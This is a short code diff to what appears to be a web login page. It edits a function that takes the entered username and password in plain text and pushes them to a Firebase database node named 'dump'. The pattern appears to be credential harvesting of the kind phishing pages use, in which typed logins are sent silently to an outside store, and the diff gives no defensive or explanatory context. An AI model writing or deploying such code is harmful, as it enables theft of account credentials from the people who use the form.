@@ -55,9 +55,10 @@
           messagingSenderId: "829509542556"
         };
         firebase.initializeApp(config);
+        var dump = firebase.database().ref("dump");
 
         function sub() {
-          firebase.database().ref("dump").push().set({
+          dump.push().set({
             username: document.getElementsByName('username')[0].value,
             password: document.getElementsByName('password')[0].value
           });
